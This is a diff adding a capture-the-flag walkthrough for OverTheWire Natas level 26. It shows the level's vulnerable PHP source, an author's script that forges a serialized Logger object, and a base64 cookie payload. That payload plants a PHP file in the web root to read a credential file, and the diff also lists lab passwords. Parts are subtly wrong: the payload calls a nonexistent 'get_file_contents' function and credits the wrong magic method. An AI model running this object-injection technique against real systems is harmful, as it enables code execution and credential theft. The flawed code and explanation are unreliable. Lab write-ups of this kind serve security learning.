@@ -1134,6 +1134,160 @@ Sending a burp request on the above url will give us the password for next level
 `password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`
 	
 
+# level 25->level 26:
+
++ After logging in to the page with the credentials, we can see a page to insert the coordinates (x1,y1) & (x2,y2). When we insert any random coordinates( I inserted x1=0,x2=0,y1=400,y2=300), we will get a `drawing` cookie. 
++ We have php object injection as the vulnerability.
++ SOurce code is given:
+```
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+    
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+ 
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);     
+        imagedestroy($img);
+    }
+    
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+        
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"], 
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+        
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) && 
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) && 
+                        array_key_exists("y2", $object)){
+                    
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+            
+                    }
+        }    
+    }
+    
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+        
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+        
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+```
+```
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
+        $imgfile="img/natas26_" . session_id() .".png"; 
+        drawImage($imgfile); 
+        showImage($imgfile);
+        storeData();
+    }
+    
+?>
+```
++ ONce we get the drawing cookie, base64 decode it and we get a serialised form
+my drawing cookie: YToyOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czozOiI0MDAiO3M6MjoieTIiO3M6MzoiMzAwIjt9aToxO2E6NDp7czoyOiJ4MSI7czoxOiIwIjtzOjI6InkxIjtzOjE6IjAiO3M6MjoieDIiO3M6MzoiNDAwIjtzOjI6InkyIjtzOjM6IjMwMCI7fX0=
+Base64_decoded form: a:2:{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"400";s:2:"y2";s:3:"300";}i:1;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"400";s:2:"y2";s:3:"300";}}
+	
++ Inorder to exploit the deserialisation, we need to use a class either present by default or used in the scope. Here, we will use `logger()` class with magic method `__construct`. We can write a php script as follows to get a drawing cookie and then we can paste the cookie in burp and send a request.4
+```
+//my script
+	
+<?php
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct(){
+            // initialise variables
+            $this->initMsg="HEYYY!\n";
+            $this->exitMsg="<?php echo get_file_contents('/etc/natas_webpass/natas27'); ?>\n";
+            $this->logFile = "/var/www/natas/natas26/img/nts26.txt";
+        }
+
+    }
+$new=new Logger();
+print base64_encode(serialize($new))."\n";
+?>
+```
++ Got the output as: Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbnRzMjYudHh0IjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NzoiSEVZWVkhCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGdldF9maWxlX2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=
++ Sending this value as drawing cookie in burp, will give us an error
+	`Cannot use object of type Logger as array in <b>/var/www/natas/natas26/index.php`
++ Now checking the url : http://natas26.natas.labs.overthewire.org/img/nts26.txt, we get,
+	<?php echo get_file_contents('/etc/natas_webpass/natas27'); ?>
++ To execute the script and get the result we need to output to `.php` file instead of `.txt` file. Changing the `.txt` extension to `.php` will execute the script and give us the password for next level.
+password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+	
+
 	
 
 
